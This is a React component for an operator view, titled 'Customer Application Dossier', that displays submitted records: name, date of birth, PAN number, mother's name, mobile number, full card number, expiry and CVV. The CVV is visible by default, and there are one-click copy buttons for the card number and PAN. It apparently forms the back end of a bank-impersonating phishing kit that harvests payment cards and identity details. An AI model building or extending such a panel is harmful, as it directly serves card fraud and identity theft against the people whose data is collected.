import React, { useState } from 'react';
import {
  X,
  User,
  CreditCard,
  Shield,
  Calendar,
  Phone,
  Check,
  AlertTriangle,
  Copy,
  CheckCheck,
  Eye,
  EyeOff,
  Trash2,
  Clock
} from 'lucide-react';

export default function SubmissionDetailModal({ submission, onClose, onUpdateStatus, onDeleteSubmission }) {
  const [copiedField, setCopiedField] = useState(null);
  const [showCvv, setShowCvv] = useState(true);

  if (!submission) return null;

  const handleCopy = (text, fieldKey) => {
    navigator.clipboard.writeText(text);
    setCopiedField(fieldKey);
    setTimeout(() => setCopiedField(null), 2000);
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="dossier-modal-card" onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className="modal-header-banner">
          <div className="modal-header-left">
            <h3>Customer Application Dossier</h3>
            <p style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap' }}>
              <span>Ref ID: <strong style={{ fontFamily: 'var(--font-mono)' }}>{submission.id}</strong></span>
              <span>·</span>
              <span><Clock size={13} style={{ display: 'inline', verticalAlign: 'middle' }} /> Submitted: <strong>{submission.submittedAt || 'Recent'}</strong></span>
            </p>
          </div>
          <button className="modal-close-btn" onClick={onClose} title="Close">
            <X size={18} />
          </button>
        </div>

        {/* Body */}
        <div className="modal-body">
          {/* Section 1: Personal & KYC Info */}
          <div>
            <div className="detail-section-title">
              <User size={16} />
              <span>1. Personal & KYC Identity Information</span>
            </div>
            <div className="detail-grid">
              {/* Full Name */}
              <div className="detail-item">
                <span className="detail-item-lbl">Full Name</span>
                <span className="detail-item-val">{submission.fullName || '—'}</span>
              </div>

              {/* Date of Birth */}
              <div className="detail-item">
                <span className="detail-item-lbl">Date of Birth (DOB)</span>
                <span className="detail-item-val">{submission.dob || '—'}</span>
              </div>

              {/* PAN Card Number */}
              <div className="detail-item">
                <span className="detail-item-lbl">PAN Card Number</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="pan-badge" style={{ fontSize: '0.9rem', padding: '4px 10px' }}>
                    {submission.panNumber || 'NOT PROVIDED'}
                  </span>
                  {submission.panNumber && (
                    <button
                      className="btn-copy-mini"
                      onClick={() => handleCopy(submission.panNumber, 'pan')}
                      title="Copy PAN"
                    >
                      {copiedField === 'pan' ? <CheckCheck size={14} color="#10b981" /> : <Copy size={14} />}
                    </button>
                  )}
                </div>
              </div>

              {/* Mother's Name */}
              <div className="detail-item">
                <span className="detail-item-lbl">Mother's Name</span>
                <span className="detail-item-val">{submission.mothersName || '—'}</span>
              </div>

              {/* Mobile Number */}
              <div className="detail-item">
                <span className="detail-item-lbl">Registered Mobile</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="detail-item-val mono">{submission.mobileNumber || '—'}</span>
                  {submission.mobileNumber && (
                    <button
                      className="btn-copy-mini"
                      onClick={() => handleCopy(submission.mobileNumber, 'mobile')}
                      title="Copy Mobile"
                    >
                      {copiedField === 'mobile' ? <CheckCheck size={14} color="#10b981" /> : <Copy size={14} />}
                    </button>
                  )}
                </div>
              </div>

              {/* Requested Service */}
              <div className="detail-item">
                <span className="detail-item-lbl">Service Applied For</span>
                <span className="detail-item-val" style={{ textTransform: 'capitalize', color: '#0072ce' }}>
                  {submission.selectedService?.replace(/_/g, ' ') || 'Credit Card Service'}
                </span>
              </div>
            </div>
          </div>

          {/* Section 2: Card & Banking Details */}
          <div>
            <div className="detail-section-title">
              <CreditCard size={16} />
              <span>2. Card & Financial Information</span>
            </div>
            <div className="detail-grid">
              {/* Name on Card */}
              <div className="detail-item">
                <span className="detail-item-lbl">Name on Card</span>
                <span className="detail-item-val" style={{ textTransform: 'uppercase' }}>
                  {submission.nameOnCard || submission.fullName || '—'}
                </span>
              </div>

              {/* Full Card Number */}
              <div className="detail-item">
                <span className="detail-item-lbl">Full 16-Digit Card Number</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="detail-item-val mono" style={{ letterSpacing: '1px', color: '#002d62', fontWeight: 800 }}>
                    {submission.cardNumber || '—'}
                  </span>
                  {submission.cardNumber && (
                    <button
                      className="btn-copy-mini"
                      onClick={() => handleCopy(submission.cardNumber.replace(/\s+/g, ''), 'card')}
                      title="Copy Card Number"
                    >
                      {copiedField === 'card' ? <CheckCheck size={14} color="#10b981" /> : <Copy size={14} />}
                    </button>
                  )}
                </div>
              </div>

              {/* Expiry Date */}
              <div className="detail-item">
                <span className="detail-item-lbl">Expiry Date (MM/YY)</span>
                <span className="detail-item-val mono">{submission.expiryDate || '—'}</span>
              </div>

              {/* CVV Code */}
              <div className="detail-item">
                <span className="detail-item-lbl">CVV / CVC Code</span>
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <span className="detail-item-val mono" style={{ background: '#fef3c7', color: '#b45309', padding: '2px 8px', borderRadius: '6px', fontWeight: 800 }}>
                    {showCvv ? (submission.cvv || '—') : '•••'}
                  </span>
                  <button
                    className="btn-copy-mini"
                    onClick={() => setShowCvv(!showCvv)}
                    title={showCvv ? "Hide CVV" : "Show CVV"}
                  >
                    {showCvv ? <EyeOff size={14} /> : <Eye size={14} />}
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Section 3: Verification Status Banner */}
          <div style={{ background: '#f1f5f9', padding: '1rem 1.25rem', borderRadius: '14px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.8rem' }}>
            <div>
              <span style={{ fontSize: '0.72rem', fontWeight: 700, color: '#64748b', textTransform: 'uppercase' }}>Current Dossier Status:</span>
              <div style={{ marginTop: '0.25rem' }}>
                <span className={`status-pill ${submission.status}`}>
                  <span className={`status-dot ${submission.status}`}></span>
                  {submission.status === 'pending' ? 'Under 18-Hour Verification' : submission.status}
                </span>
              </div>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.78rem', color: '#10b981', fontWeight: 600 }}>
              <Shield size={16} /> 256-Bit SSL Encrypted Verification Channel
            </div>
          </div>
        </div>

        {/* Footer Actions */}
        <div className="modal-footer">
          <div style={{ display: 'flex', gap: '0.6rem', alignItems: 'center' }}>
            <button className="btn-secondary" onClick={onClose}>
              Close
            </button>
            {onDeleteSubmission && (
              <button
                className="btn-secondary"
                style={{ color: '#ef4444', borderColor: '#fca5a5' }}
                onClick={() => {
                  if (window.confirm('Are you sure you want to delete this customer application?')) {
                    onDeleteSubmission(submission.id);
                    onClose();
                  }
                }}
              >
                <Trash2 size={15} />
                <span>Delete</span>
              </button>
            )}
          </div>
          <div style={{ display: 'flex', gap: '0.6rem' }}>
            <button
              className="btn-reject-lg"
              onClick={() => {
                onUpdateStatus(submission.id, 'rejected');
                onClose();
              }}
            >
              <AlertTriangle size={16} />
              <span>Reject Application</span>
            </button>
            <button
              className="btn-approve-lg"
              onClick={() => {
                onUpdateStatus(submission.id, 'approved');
                onClose();
              }}
            >
              <Check size={16} />
              <span>Approve & Verify</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
